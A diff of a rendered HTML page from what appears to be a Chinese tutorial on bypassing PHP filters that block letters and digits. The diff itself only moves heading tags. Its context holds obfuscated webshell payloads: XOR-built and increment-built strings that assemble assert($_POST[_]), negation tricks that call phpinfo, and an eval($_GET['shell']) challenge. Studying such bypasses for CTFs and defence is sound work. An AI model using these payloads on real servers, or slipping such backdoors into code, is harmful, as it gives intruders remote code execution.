@@ -326,14 +326,14 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#39;/[a-z0-9]/is&#39;</span>,<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;shell&#39;</span>])) {
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">eval</span>(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;shell&#39;</span>]);
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="异或">异或</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span></code></pre></div><h2 id="异或">异或
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span>(<span style="color:#f1fa8c">&#39;%01&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%13&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%13&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%05&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%12&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%14&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>); <span style="color:#6272a4">// $_=&#39;assert&#39;;
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;_&#39;</span><span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%0D&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;]&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%2F&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%0E&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;]&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%09&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;]&#39;</span>); <span style="color:#6272a4">// $__=&#39;_POST&#39;;
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$$__</span>;
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$_</span>(<span style="color:#8be9fd;font-style:italic">$___</span>[_]); <span style="color:#6272a4">// assert($_POST[_]);
-</span></span></span></code></pre></div><h2 id="取反">取反</h2>
-<p>UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code></p>
+</span></span></span></code></pre></div><h2 id="取反">取反
+</h2><p>UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code></p>
 <p>弱类型，true的值为1，故<code>true+true==2</code>，也就是<code>('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span>(<span style="color:#f1fa8c">&#39;&gt;&#39;</span><span style="color:#ff79c6">&gt;</span><span style="color:#f1fa8c">&#39;&lt;&#39;</span>)<span style="color:#ff79c6">+</span>(<span style="color:#f1fa8c">&#39;&gt;&#39;</span><span style="color:#ff79c6">&gt;</span><span style="color:#f1fa8c">&#39;&lt;&#39;</span>);
@@ -372,8 +372,8 @@
 </span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">echo</span> <span style="color:#8be9fd;font-style:italic">$arr_str</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;--&gt;&#39;</span><span style="color:#ff79c6">.~</span><span style="color:#8be9fd;font-style:italic">$arr_str</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]{<span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&lt;br&gt;&#39;</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span> <span style="color:#ff79c6">?&gt;</span>
-</span></span></code></pre></div><h2 id="递增递减">递增／递减</h2>
-<p>PHP 支持 C 风格的前／后递增与递减运算符。</p>
+</span></span></code></pre></div><h2 id="递增递减">递增／递减
+</h2><p>PHP 支持 C 风格的前／后递增与递减运算符。</p>
 <p>所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
 <p>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
 <p>如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>
@@ -424,8 +424,8 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$$____</span>;
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$___</span>(<span style="color:#8be9fd;font-style:italic">$_</span>[_]); <span style="color:#6272a4">// ASSERT($_POST[_]);
-</span></span></span></code></pre></div><h2 id="php7动态函数">php7动态函数</h2>
-<p>看来已经不足以阻挡了.加点难度</p>
+</span></span></span></code></pre></div><h2 id="php7动态函数">php7动态函数
+</h2><p>看来已经不足以阻挡了.加点难度</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;code&#39;</span>])){
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$code</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;code&#39;</span>];
@@ -456,12 +456,12 @@
 <p>最后,利用之前的取反,得到答案(phpinfo)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>(~%8F%97%8F%96%91%99%90)();
 </span></span></code></pre></div><p>(上面url表示的都是abcd&hellip;之外的不可见字符)</p>
-<h2 id="回调函数">回调函数</h2>
-<p>回调函数的运用在一段时间里曾被webshell广泛应用。</p>
+<h2 id="回调函数">回调函数
+</h2><p>回调函数的运用在一段时间里曾被webshell广泛应用。</p>
 <p>首先，我们需要知道什么是回调函数，回调是什么意思？</p>
 <p>所谓是回调其实就是间接调用，当PHP调用用户自定义的函数时，必须要通过一个代理函数来进行调用，所以称为回调函数。</p>
-<h4 id="array_walk">array_walk()</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>array_walk(<span style="color:#ff79c6">array</span>,myfunction,parameter<span style="color:#ff79c6">...</span>)
+<h4 id="array_walk">array_walk()
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>array_walk(<span style="color:#ff79c6">array</span>,myfunction,parameter<span style="color:#ff79c6">...</span>)
 </span></span></code></pre></div><div class="table-wrapper"><table>
 <thead>
 <tr>
@@ -533,7 +533,7 @@
     <aside class="related-contents--wrapper">
     
     
-        <h2 class="section-title">Related contents</h2>
+        <h2 class="section-title"></h2>
         <div class="related-contents">
             <div class="flex article-list--tile">
                 
